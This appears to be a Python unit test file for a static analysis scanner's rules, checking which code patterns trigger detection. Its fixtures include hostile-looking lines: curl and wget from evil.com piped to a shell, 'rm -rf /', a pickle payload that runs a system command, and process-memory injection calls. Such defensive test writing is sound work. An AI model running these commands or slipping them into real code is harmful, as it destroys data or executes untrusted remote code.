"""Unit tests for the static analysis rule catalog.

Tests each rule against positive (must trigger) and negative (must NOT trigger)
patterns, establishing the exact false-positive and detection boundaries.
"""

import unittest
from static_analysis.rules import get_default_rules
from secrets_scanner.models import Confidence, Severity


class TestStaticAnalysisRules(unittest.TestCase):

    def setUp(self):
        self.rules = {r.id: r for r in get_default_rules()}

    # =========================================================================
    # Python Rules
    # =========================================================================

    def test_py_dangerous_ctypes_memory(self):
        rule = self.rules["PY_DANGEROUS_CTYPES_MEMORY"]
        self.assertEqual(rule.severity, Severity.CRITICAL)
        self.assertEqual(rule.confidence, Confidence.HIGH)

        # Positive matches: raw memory manipulation
        self.assertTrue(rule.matcher.match("ctypes.memmove(dest, src, 1024)", "app.py"))
        self.assertTrue(rule.matcher.match("ctypes.memset(buf, 0, 1024)", "app.py"))
        self.assertTrue(rule.matcher.match("kernel32.VirtualAlloc(None, size, 0x1000, 0x40)", "app.py"))
        self.assertTrue(rule.matcher.match("libc.mprotect(addr, size, 7)", "app.py"))
        self.assertTrue(rule.matcher.match("kernel32.WriteProcessMemory(hProcess, addr, buf, size, None)", "app.py"))

        # Negative matches: standard safe Python code
        self.assertFalse(rule.matcher.match("import math\nx = math.sqrt(16)", "app.py"))
        self.assertFalse(rule.matcher.match("data = bytearray(1024)", "app.py"))
        self.assertFalse(rule.matcher.match("class MemoryBuffer:\n    def __init__(self):\n        pass", "app.py"))

    def test_py_eval_non_literal(self):
        rule = self.rules["PY_EVAL_NON_LITERAL"]
        self.assertEqual(rule.severity, Severity.HIGH)
        self.assertEqual(rule.confidence, Confidence.MEDIUM)

        # Positive matches: dynamic variables or expressions
        self.assertTrue(rule.matcher.match("eval(user_input)", "app.py"))
        self.assertTrue(rule.matcher.match("exec(raw_script)", "app.py"))
        self.assertTrue(rule.matcher.match("eval(f'2 + {x}')", "app.py"))
        self.assertTrue(rule.matcher.match("eval(data + 'suffix')", "app.py"))

        # Negative matches: literal constants or safe alternatives
        self.assertFalse(rule.matcher.match("eval('2 + 2')", "app.py"))
        self.assertFalse(rule.matcher.match('eval("{\'key\': 123}")', "app.py"))
        self.assertFalse(rule.matcher.match("exec('print(\"hello\")')", "app.py"))
        self.assertFalse(rule.matcher.match("import ast\nast.literal_eval(payload)", "app.py"))

    def test_py_subprocess_dynamic_shell(self):
        rule = self.rules["PY_SUBPROCESS_DYNAMIC_SHELL"]
        self.assertEqual(rule.severity, Severity.HIGH)
        self.assertEqual(rule.confidence, Confidence.MEDIUM)

        # Positive matches: dynamic command execution with shell=True or os.system variables
        self.assertTrue(rule.matcher.match("os.system(user_command)", "app.py"))
        self.assertTrue(rule.matcher.match("os.system('echo ' + user_arg)", "app.py"))
        self.assertTrue(rule.matcher.match("subprocess.Popen(cmd, shell=True)", "app.py"))
        self.assertTrue(rule.matcher.match("subprocess.run(f'ping {host}', shell=True)", "app.py"))
        self.assertTrue(rule.matcher.match("subprocess.check_call(arg, shell=True)", "app.py"))

        # Negative matches: constant string commands or list arguments with shell=False
        self.assertFalse(rule.matcher.match("os.system('uname -a')", "app.py"))
        self.assertFalse(rule.matcher.match('os.system("ls -la /tmp")', "app.py"))
        self.assertFalse(rule.matcher.match("subprocess.run(['ls', '-la'], shell=False)", "app.py"))
        self.assertFalse(rule.matcher.match("subprocess.check_output(['git', 'status'])", "app.py"))

    def test_py_untrusted_pickle(self):
        rule = self.rules["PY_UNTRUSTED_PICKLE"]
        self.assertEqual(rule.severity, Severity.HIGH)
        self.assertEqual(rule.confidence, Confidence.MEDIUM)

        # Positive matches: pickle.loads in proximity to network/request/stream context
        positive_ctx = (
            "def handle_client(request):\n"
            "    data = request.get_data()\n"
            "    obj = pickle.loads(data)\n"
            "    return obj\n"
        )
        self.assertTrue(rule.matcher.match(positive_ctx, "server.py"))

        socket_ctx = (
            "client_sock, addr = server.accept()\n"
            "payload = client_sock.recv(4096)\n"
            "result = pickle.loads(payload)\n"
        )
        self.assertTrue(rule.matcher.match(socket_ctx, "network.py"))

        # Negative matches: safe serialization or internal static deserialization
        negative_clean = (
            "def load_cache():\n"
            "    import json\n"
            "    return json.loads(request.data)\n"
        )
        self.assertFalse(rule.matcher.match(negative_clean, "cache.py"))

        no_context_pickle = (
            "# Internal test utility\n"
            "magic_number = 42\n"
            "pickle.loads(b'cos\\nsystem\\n(S\\'id\\'\\ntR.')\n"
        )
        self.assertFalse(rule.matcher.match(no_context_pickle, "test.py"))

    def test_py_insecure_bind_all(self):
        rule = self.rules["PY_INSECURE_BIND_ALL"]
        self.assertEqual(rule.severity, Severity.LOW)
        self.assertEqual(rule.confidence, Confidence.MEDIUM)

        # Positive matches: explicit 0.0.0.0 bind or unauthenticated debug server
        self.assertTrue(rule.matcher.match("sock.bind(('0.0.0.0', 8080))", "server.py"))
        self.assertTrue(rule.matcher.match("app.run(host='0.0.0.0', debug=True)", "app.py"))
        self.assertTrue(rule.matcher.match('server.run(port=80, host="0.0.0.0", debug=True)', "app.py"))

        # Negative matches: localhost or loopback binds
        self.assertFalse(rule.matcher.match("sock.bind(('127.0.0.1', 8080))", "server.py"))
        self.assertFalse(rule.matcher.match("app.run(host='127.0.0.1', port=5000)", "app.py"))
        self.assertFalse(rule.matcher.match("app.run(host='localhost')", "app.py"))

    # =========================================================================
    # JavaScript / TypeScript Rules
    # =========================================================================

    def test_js_eval_non_literal(self):
        rule = self.rules["JS_EVAL_NON_LITERAL"]
        self.assertEqual(rule.severity, Severity.HIGH)
        self.assertEqual(rule.confidence, Confidence.MEDIUM)

        # Positive matches: dynamic eval or new Function
        self.assertTrue(rule.matcher.match("eval(userInput);", "app.js"))
        self.assertTrue(rule.matcher.match("eval('2 +' + dynamicVal);", "app.js"))
        self.assertTrue(rule.matcher.match("const fn = new Function('a', dynamicScript);", "app.js"))

        # Negative matches: literal strings or JSON.parse
        self.assertFalse(rule.matcher.match("eval('2 + 2');", "app.js"))
        self.assertFalse(rule.matcher.match('eval("console.log(\'safe\')");', "app.js"))
        self.assertFalse(rule.matcher.match("const data = JSON.parse(userInput);", "app.js"))

    def test_js_child_process_dynamic_exec(self):
        rule = self.rules["JS_CHILD_PROCESS_DYNAMIC_EXEC"]
        self.assertEqual(rule.severity, Severity.HIGH)
        self.assertEqual(rule.confidence, Confidence.MEDIUM)

        # Positive matches: concatenated or template literal commands
        self.assertTrue(rule.matcher.match("child_process.exec(`ping ${host}`, cb);", "net.js"))
        self.assertTrue(rule.matcher.match("child_process.exec('cat ' + filename, cb);", "file.js"))
        self.assertTrue(rule.matcher.match("child_process.execSync(cmd + ' --force');", "build.js"))

        # Negative matches: execFile or spawn with array arguments, or static commands
        self.assertFalse(rule.matcher.match("child_process.execFile('ping', [host], cb);", "net.js"))
        self.assertFalse(rule.matcher.match("child_process.spawn('ls', ['-la']);", "cli.js"))
        self.assertFalse(rule.matcher.match("child_process.exec('uname -a', cb);", "info.js"))

    def test_js_obfuscated_code(self):
        rule = self.rules["JS_OBFUSCATED_CODE"]
        self.assertEqual(rule.severity, Severity.LOW)
        self.assertEqual(rule.confidence, Confidence.LOW)

        # Positive match 1: Dean Edwards / JS packed wrapper
        packed_code = "eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--)d[c]=k[c]||c;k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('0 1=\"2\";',3,3,'var|hello|world'.split('|'),0,{}))"
        self.assertTrue(rule.matcher.match(packed_code, "src/analytics.js"))

        # Positive match 2: Long line with dense hex escapes outside build
        dense_hex = "var _0x1234 = ['\\x61\\x62\\x63', '\\x64\\x65\\x66', '\\x67\\x68\\x69', '\\x6a\\x6b\\x6c', '\\x6d\\x6e\\x6f', '\\x70\\x71\\x72', '\\x73\\x74\\x75', '\\x76\\x77\\x78', '\\x79\\x7a\\x30', '\\x31\\x32\\x33', '\\x34\\x35\\x36', '\\x37\\x38\\x39', '\\x41\\x42\\x43', '\\x44\\x45\\x46', '\\x47\\x48\\x49', '\\x4a\\x4b\\x4c'];"
        long_dense_hex = dense_hex + (" // " + "padding_" * 200)
        self.assertTrue(rule.matcher.match(long_dense_hex, "src/agent.js"))

        # Negative match: Same file located inside dist/ or ending in .min.js is skipped
        self.assertFalse(rule.matcher.match(packed_code, "dist/bundle.js"))
        self.assertFalse(rule.matcher.match(packed_code, "public/vendor.min.js"))

        # Negative match: Normal readable source code
        readable_code = "function calculateTotal(items) {\n    return items.reduce((sum, item) => sum + item.price, 0);\n}\n"
        self.assertFalse(rule.matcher.match(readable_code, "src/cart.js"))

    # =========================================================================
    # Shell Rules
    # =========================================================================

    def test_sh_curl_pipe_shell(self):
        rule = self.rules["SH_CURL_PIPE_SHELL"]
        self.assertEqual(rule.severity, Severity.CRITICAL)
        self.assertEqual(rule.confidence, Confidence.HIGH)

        # Positive matches: piping download directly to shell
        self.assertTrue(rule.matcher.match("curl https://evil.com/setup.sh | bash", "install.sh"))
        self.assertTrue(rule.matcher.match("wget -qO- https://evil.com/install.sh | sh", "deploy.sh"))
        self.assertTrue(rule.matcher.match("curl -fsSL https://get.docker.com | zsh", "setup.zsh"))

        # Negative matches: download to file first
        self.assertFalse(rule.matcher.match("curl -o installer.sh https://example.com/installer.sh", "install.sh"))
        self.assertFalse(rule.matcher.match("wget https://example.com/file.tar.gz && tar -xzf file.tar.gz", "deploy.sh"))
        self.assertFalse(rule.matcher.match("curl -s https://api.github.com/repos | jq .name", "check.sh"))

    def test_sh_rm_rf_dynamic_var(self):
        rule = self.rules["SH_RM_RF_DYNAMIC_VAR"]
        self.assertEqual(rule.severity, Severity.CRITICAL)
        self.assertEqual(rule.confidence, Confidence.HIGH)

        # Positive matches: unvalidated variable expansion or root deletion
        self.assertTrue(rule.matcher.match("rm -rf $TARGET_DIR", "clean.sh"))
        self.assertTrue(rule.matcher.match("rm -rf ${BUILD_FOLDER}/*", "clean.sh"))
        self.assertTrue(rule.matcher.match('rm -rf "$CACHE_DIR"', "clean.sh"))
        self.assertTrue(rule.matcher.match("rm -rf /", "danger.sh"))
        self.assertTrue(rule.matcher.match("rm -rf /*", "danger.sh"))

        # Negative matches: scoped concrete paths or guarded expansion
        self.assertFalse(rule.matcher.match("rm -rf ./tmp/cache", "clean.sh"))
        self.assertFalse(rule.matcher.match("rm -rf build/", "clean.sh"))
        self.assertFalse(rule.matcher.match("rm -rf dist/package", "clean.sh"))
        self.assertFalse(rule.matcher.match("rm -rf ${TARGET_DIR:?}", "clean.sh"))


if __name__ == "__main__":
    unittest.main()
